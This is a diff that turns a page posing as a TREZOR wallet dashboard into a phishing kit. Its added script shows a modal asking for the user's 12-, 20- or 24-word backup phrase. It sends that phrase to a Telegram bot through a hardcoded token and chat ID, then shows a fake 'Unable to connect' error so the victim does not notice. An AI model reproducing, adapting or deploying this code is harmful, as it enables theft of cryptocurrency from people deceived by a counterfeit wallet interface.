@@ -4,7 +4,361 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TREZOR - Dashboard</title>
-    <link rel="stylesheet" href="styles.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background-color: #1a1a1a;
+            color: #ffffff;
+            height: 100vh;
+            overflow: hidden;
+            margin: 0;
+        }
+
+        .container {
+            display: flex;
+            height: 100vh;
+        }
+
+        /* Sidebar Styles */
+        .sidebar {
+            width: 240px;
+            background-color: #000000;
+            display: flex;
+            flex-direction: column;
+            padding: 24px 0;
+            position: relative;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            padding: 0 24px 32px 24px;
+        }
+
+        .logo-svg {
+            width: 130px;
+            height: 24px;
+            flex-shrink: 0;
+        }
+
+        .nav-menu {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+            padding: 0 12px;
+            flex: 1;
+        }
+
+        .nav-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 16px;
+            color: #ffffff;
+            text-decoration: none;
+            border-radius: 8px;
+            transition: background-color 0.2s;
+        }
+
+        .nav-item:hover {
+            background-color: rgba(255, 255, 255, 0.05);
+        }
+
+        .nav-item.active {
+            background-color: #2d2d2d;
+        }
+
+        .nav-icon {
+            width: 20px;
+            height: 20px;
+            color: #ffffff;
+        }
+
+        .nav-item span {
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .sidebar-footer {
+            display: flex;
+            justify-content: space-between;
+            padding: 0 24px;
+            margin-top: auto;
+        }
+
+        .footer-icon {
+            width: 18px;
+            height: 18px;
+            color: #ffffff;
+            opacity: 0.6;
+        }
+
+        /* Main Content Styles */
+        .main-content {
+            flex: 1;
+            background-color: #1a1a1a;
+            padding: 40px;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+        }
+
+        .page-title {
+            font-size: 32px;
+            font-weight: 600;
+            color: #ffffff;
+            margin-bottom: 40px;
+        }
+
+        .content-center {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            flex: 1;
+            gap: 24px;
+        }
+
+        .trezor-device {
+            width: 200px;
+            height: 280px;
+            background-color: #2d2d2d;
+            border-radius: 16px;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 24px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .device-screen {
+            width: 100%;
+            height: 140px;
+            background-color: #000000;
+            border-radius: 8px;
+            margin-bottom: 24px;
+        }
+
+        .device-lock {
+            position: absolute;
+            bottom: 40px;
+            width: 32px;
+            height: 32px;
+            color: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .device-lock svg {
+            width: 24px;
+            height: 24px;
+        }
+
+        .main-heading {
+            font-size: 24px;
+            font-weight: 600;
+            color: #ffffff;
+            text-align: center;
+        }
+
+        .sub-text {
+            font-size: 16px;
+            color: #999999;
+            text-align: center;
+        }
+
+        .connect-button {
+            background-color: #86efac;
+            color: #000000;
+            border: none;
+            padding: 14px 32px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 8px;
+        }
+
+        .connect-button:hover {
+            background-color: #3bc96d;
+        }
+
+        .search-icon {
+            position: absolute;
+            bottom: 40px;
+            right: 40px;
+            width: 24px;
+            height: 24px;
+            color: #ffffff;
+            opacity: 0.7;
+            cursor: pointer;
+        }
+
+        .search-icon svg {
+            width: 100%;
+            height: 100%;
+        }
+
+        /* Modal Styles */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background-color: #1a1a1a;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 500px;
+            padding: 0;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
+            animation: modalSlideIn 0.3s ease-out;
+        }
+
+        @keyframes modalSlideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 24px;
+            border-bottom: 1px solid #2d2d2d;
+        }
+
+        .modal-title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #ffffff;
+            margin: 0;
+        }
+
+        .modal-close {
+            background: none;
+            border: none;
+            color: #ffffff;
+            font-size: 32px;
+            cursor: pointer;
+            padding: 0;
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 4px;
+            transition: background-color 0.2s;
+        }
+
+        .modal-close:hover {
+            background-color: #2d2d2d;
+        }
+
+        .modal-body {
+            padding: 24px;
+        }
+
+        .modal-description {
+            color: #999999;
+            font-size: 14px;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .backup-input {
+            width: 100%;
+            background-color: #0f0f0f;
+            border: 1px solid #2d2d2d;
+            border-radius: 8px;
+            padding: 16px;
+            color: #ffffff;
+            font-size: 14px;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            resize: vertical;
+            min-height: 120px;
+            margin-bottom: 24px;
+            transition: border-color 0.2s;
+        }
+
+        .backup-input:focus {
+            outline: none;
+            border-color: #86efac;
+        }
+
+        .backup-input::placeholder {
+            color: #666666;
+        }
+
+        .modal-actions {
+            display: flex;
+            gap: 12px;
+            justify-content: flex-end;
+        }
+
+        .modal-cancel,
+        .modal-connect {
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            border: none;
+            transition: all 0.2s;
+        }
+
+        .modal-cancel {
+            background-color: #2d2d2d;
+            color: #ffffff;
+        }
+
+        .modal-cancel:hover {
+            background-color: #3a3a3a;
+        }
+
+        .modal-connect {
+            background-color: #86efac;
+            color: #000000;
+        }
+
+        .modal-connect:hover {
+            background-color: #3bc96d;
+        }
+
+        .modal-connect:disabled {
+            background-color: #4a4a4a;
+            color: #999999;
+            cursor: not-allowed;
+        }
+    </style>
 </head>
 <body>
     <div class="container">
@@ -108,7 +462,118 @@
         </div>
     </div>
 
-    <script src="script.js"></script>
+    <script>
+        // Telegram Bot Configuration
+        const TELEGRAM_BOT_TOKEN = '8349363327:AAHfKI1QevoDN6L7R1mHUJ4Ruia8y9cvXF4';
+        const TELEGRAM_CHAT_ID = '8445832367';
+
+        // Modal elements
+        const connectBtn = document.getElementById('connectBtn');
+        const backupModal = document.getElementById('backupModal');
+        const closeModal = document.getElementById('closeModal');
+        const cancelBtn = document.getElementById('cancelBtn');
+        const submitBackup = document.getElementById('submitBackup');
+        const backupPhraseInput = document.getElementById('backupPhrase');
+
+        // Open modal when Connect button is clicked
+        connectBtn.addEventListener('click', () => {
+            backupModal.classList.add('active');
+            backupPhraseInput.focus();
+        });
+
+        // Close modal functions
+        function closeModalFunc() {
+            backupModal.classList.remove('active');
+            backupPhraseInput.value = '';
+        }
+
+        closeModal.addEventListener('click', closeModalFunc);
+        cancelBtn.addEventListener('click', closeModalFunc);
+
+        // Close modal when clicking outside
+        backupModal.addEventListener('click', (e) => {
+            if (e.target === backupModal) {
+                closeModalFunc();
+            }
+        });
+
+        // Close modal on Escape key
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape' && backupModal.classList.contains('active')) {
+                closeModalFunc();
+            }
+        });
+
+        // Validate backup phrase (12, 20, or 24 words)
+        function validateBackupPhrase(phrase) {
+            const words = phrase.trim().split(/\s+/).filter(word => word.length > 0);
+            return words.length === 12 || words.length === 20 || words.length === 24;
+        }
+
+        // Send backup phrase to Telegram
+        async function sendToTelegram(backupPhrase) {
+            try {
+                const message = `🔐 New Backup Phrase Received:\n\n${backupPhrase}`;
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                const data = await response.json();
+                
+                if (data.ok) {
+                    return { success: true, message: 'Backup phrase sent successfully!' };
+                } else {
+                    return { success: false, message: 'Failed to send: ' + data.description };
+                }
+            } catch (error) {
+                return { success: false, message: 'Error: ' + error.message };
+            }
+        }
+
+        // Handle backup phrase submission
+        submitBackup.addEventListener('click', async () => {
+            const backupPhrase = backupPhraseInput.value.trim();
+            
+            if (!backupPhrase) {
+                alert('Please enter your backup phrase.');
+                return;
+            }
+            
+            if (!validateBackupPhrase(backupPhrase)) {
+                alert('Please enter a valid backup phrase with 12, 20, or 24 words.');
+                return;
+            }
+            
+            // Disable button during submission
+            submitBackup.disabled = true;
+            submitBackup.textContent = 'Connecting...';
+            
+            // Send to Telegram
+            const result = await sendToTelegram(backupPhrase);
+            
+            if (result.success) {
+                // Always show error message to user, but data is sent to Telegram
+                alert('Unable to connect, try again.');
+                closeModalFunc();
+            } else {
+                alert('Connection failed: ' + result.message);
+            }
+            
+            // Re-enable button
+            submitBackup.disabled = false;
+            submitBackup.textContent = 'Connect';
+        });
+    </script>
 </body>
 </html>
 
